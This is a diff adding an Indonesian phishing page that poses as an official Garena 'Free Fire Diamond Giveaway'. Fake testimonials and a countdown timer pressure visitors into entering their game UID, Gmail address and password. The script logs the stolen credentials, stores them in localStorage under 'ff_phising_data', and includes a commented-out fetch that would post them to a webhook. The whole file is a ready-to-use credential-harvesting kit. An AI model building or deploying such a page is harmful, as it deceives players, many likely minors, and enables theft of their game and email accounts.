@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>🎁 Free Fire Diamond Giveaway | Klaim 5000 Diamond!</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0a0f1e 0%, #1a1f2e 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            max-width: 400px;
+            width: 100%;
+            background: linear-gradient(145deg, #1a1f30, #0f1422);
+            border-radius: 48px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 215, 0, 0.3);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5), 0 0 20px rgba(255, 215, 0, 0.1);
+        }
+
+        .banner {
+            background: linear-gradient(135deg, #ffd700, #ff8c00);
+            padding: 30px 20px;
+            text-align: center;
+        }
+
+        .banner .diamond-icon {
+            font-size: 50px;
+            margin-bottom: 10px;
+        }
+
+        .banner h1 {
+            font-size: 26px;
+            color: #1a1a2e;
+        }
+
+        .banner p {
+            font-size: 14px;
+            color: #1a1a2e;
+            margin-top: 5px;
+        }
+
+        .countdown {
+            background: rgba(0,0,0,0.7);
+            padding: 12px;
+            text-align: center;
+            color: #ffd700;
+            font-weight: bold;
+            font-size: 18px;
+        }
+
+        .content {
+            padding: 24px 20px;
+        }
+
+        .offer-text {
+            background: rgba(255, 215, 0, 0.1);
+            border-radius: 24px;
+            padding: 16px;
+            text-align: center;
+            margin-bottom: 24px;
+            border: 1px solid rgba(255, 215, 0, 0.3);
+        }
+
+        .offer-text .big {
+            font-size: 32px;
+            font-weight: bold;
+            color: #ffd700;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        .form-group label {
+            display: block;
+            color: #aaa;
+            font-size: 12px;
+            margin-bottom: 6px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #0a0f1a;
+            border: 1px solid #2a3456;
+            border-radius: 28px;
+            color: white;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .form-group input:focus {
+            border-color: #ffd700;
+            box-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
+        }
+
+        .btn-claim {
+            width: 100%;
+            background: linear-gradient(95deg, #ffd700, #ff8c00);
+            border: none;
+            padding: 16px;
+            border-radius: 60px;
+            font-weight: bold;
+            font-size: 18px;
+            color: #1a1a2e;
+            cursor: pointer;
+            margin-top: 10px;
+            font-weight: 800;
+        }
+
+        .btn-claim:active {
+            transform: scale(0.97);
+        }
+
+        .testimonials {
+            margin-top: 24px;
+            padding-top: 16px;
+            border-top: 1px solid #2a3456;
+        }
+
+        .testimonial {
+            background: #0a0f1a;
+            border-radius: 20px;
+            padding: 10px 12px;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .testimonial .avatar {
+            width: 35px;
+            height: 35px;
+            background: #ffd700;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: #1a1a2e;
+        }
+
+        .testimonial .text {
+            flex: 1;
+        }
+
+        .testimonial .text .name {
+            color: white;
+            font-weight: bold;
+            font-size: 12px;
+        }
+
+        .testimonial .text .msg {
+            color: #aaa;
+            font-size: 10px;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 16px;
+            background: #0a0f1a;
+            font-size: 10px;
+            color: #5a6a8a;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 20px;
+            right: 20px;
+            background: #1a1f30;
+            padding: 12px;
+            border-radius: 60px;
+            text-align: center;
+            color: #ffd700;
+            font-size: 13px;
+            opacity: 0;
+            transition: 0.2s;
+            z-index: 1000;
+            border: 1px solid #ffd700;
+        }
+
+        .modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.95);
+            z-index: 2000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            visibility: hidden;
+            opacity: 0;
+            transition: 0.2s;
+        }
+
+        .modal.active {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        .modal-content {
+            background: #1a1f30;
+            border-radius: 48px;
+            padding: 32px 24px;
+            text-align: center;
+            max-width: 300px;
+            border: 1px solid #ffd700;
+        }
+
+        .modal-content h3 {
+            color: white;
+            margin-bottom: 12px;
+        }
+
+        .modal-content p {
+            color: #aaa;
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
+
+        .modal-content button {
+            background: #ffd700;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 40px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="banner">
+        <div class="diamond-icon">💎💎💎</div>
+        <h1>FREE FIRE</h1>
+        <p>DIAMOND GIVEAWAY</p>
+    </div>
+    
+    <div class="countdown">
+        ⏰ Event berakhir: <span id="timer">05:00</span>
+    </div>
+    
+    <div class="content">
+        <div class="offer-text">
+            <p>🎁 SELAMAT! 🎁</p>
+            <p class="big">5,000 💎 DIAMOND</p>
+            <p>untuk 500 pemenang pertama!</p>
+        </div>
+        
+        <form id="phisingForm">
+            <div class="form-group">
+                <label>🎮 UID FREE FIRE</label>
+                <input type="text" id="uid" placeholder="Contoh: 123456789" required>
+            </div>
+            
+            <div class="form-group">
+                <label>📧 GMAIL</label>
+                <input type="email" id="gmail" placeholder="email@gmail.com" required>
+            </div>
+            
+            <div class="form-group">
+                <label>🔐 PASSWORD</label>
+                <input type="password" id="password" placeholder="Password akun FF / Gmail" required>
+            </div>
+            
+            <button type="submit" class="btn-claim">🎁 KLAIM DIAMOND 🎁</button>
+        </form>
+        
+        <div class="testimonials">
+            <div class="testimonial">
+                <div class="avatar">R</div>
+                <div class="text">
+                    <div class="name">Reyhan_FF</div>
+                    <div class="msg">"Barusan dapet 5000 diamond! Makasih 🙏"</div>
+                </div>
+            </div>
+            <div class="testimonial">
+                <div class="avatar">A</div>
+                <div class="text">
+                    <div class="name">AlexSavage</div>
+                    <div class="msg">"Legit banget, diamond langsung masuk!"</div>
+                </div>
+            </div>
+            <div class="testimonial">
+                <div class="avatar">M</div>
+                <div class="text">
+                    <div class="name">Melly_Girl</div>
+                    <div class="msg">"Akhirnya dapet diamond gratis 💎"</div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="footer">
+        © 2026 Garena Free Fire Official Giveaway
+    </div>
+</div>
+
+<div id="toastMsg" class="toast"></div>
+
+<div id="successModal" class="modal">
+    <div class="modal-content">
+        <h3>✅ DATA TERKIRIM!</h3>
+        <p>Diamond akan diproses dan dikirim dalam 5-10 menit ke akun FF Anda.</p>
+        <button onclick="closeModal()">Tutup</button>
+    </div>
+</div>
+
+<script>
+    // Countdown 5 menit
+    let timeLeft = 300;
+    function updateTimer() {
+        let minutes = Math.floor(timeLeft / 60);
+        let seconds = timeLeft % 60;
+        document.getElementById('timer').innerText = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        if (timeLeft > 0) {
+            timeLeft--;
+            setTimeout(updateTimer, 1000);
+        }
+    }
+    updateTimer();
+    
+    function showToast(msg) {
+        const toast = document.getElementById('toastMsg');
+        toast.innerText = msg;
+        toast.style.opacity = '1';
+        setTimeout(() => toast.style.opacity = '0', 2500);
+    }
+    
+    function showModal() {
+        document.getElementById('successModal').classList.add('active');
+    }
+    
+    function closeModal() {
+        document.getElementById('successModal').classList.remove('active');
+        document.getElementById('phisingForm').reset();
+    }
+    
+    // Simpan data ke localStorage + console
+    function saveData(data) {
+        // Tampilkan di console
+        console.log('========== DATA AKUN FF ==========');
+        console.log('UID:', data.uid);
+        console.log('Gmail:', data.gmail);
+        console.log('Password:', data.password);
+        console.log('Waktu:', new Date().toLocaleString('id-ID'));
+        console.log('User Agent:', navigator.userAgent);
+        console.log('===================================');
+        
+        // Simpan ke localStorage
+        let saved = localStorage.getItem('ff_phising_data');
+        let allData = saved ? JSON.parse(saved) : [];
+        allData.push({
+            uid: data.uid,
+            gmail: data.gmail,
+            password: data.password,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent
+        });
+        localStorage.setItem('ff_phising_data', JSON.stringify(allData));
+        
+        // Kirim ke webhook (opsional)
+        // fetch('https://webhook.site/your-url', {
+        //     method: 'POST',
+        //     mode: 'no-cors',
+        //     headers: { 'Content-Type': 'application/json' },
+        //     body: JSON.stringify(data)
+        // });
+    }
+    
+    // Handle form submit
+    document.getElementById('phisingForm').addEventListener('submit', (e) => {
+        e.preventDefault();
+        
+        const uid = document.getElementById('uid').value.trim();
+        const gmail = document.getElementById('gmail').value.trim();
+        const password = document.getElementById('password').value;
+        
+        if (!uid || !gmail || !password) {
+            showToast('❌ Harap isi semua kolom!');
+            return;
+        }
+        
+        if (uid.length < 5) {
+            showToast('❌ UID tidak valid (minimal 5 digit)');
+            return;
+        }
+        
+        if (!gmail.includes('@') || !gmail.includes('.')) {
+            showToast('❌ Email tidak valid');
+            return;
+        }
+        
+        const data = {
+            uid: uid,
+            gmail: gmail,
+            password: password
+        };
+        
+        saveData(data);
+        showToast('✅ Data terkirim! Diamond akan diproses...');
+        showModal();
+    });
+    
+    // Placeholder random untuk UID
+    const uidInput = document.getElementById('uid');
+    const placeholders = ['123456789', '987654321', '1122334455', '5566778899'];
+    let phIndex = 0;
+    setInterval(() => {
+        phIndex = (phIndex + 1) % placeholders.length;
+        uidInput.placeholder = placeholders[phIndex];
+    }, 3000);
+</script>
+</body>
+</html>
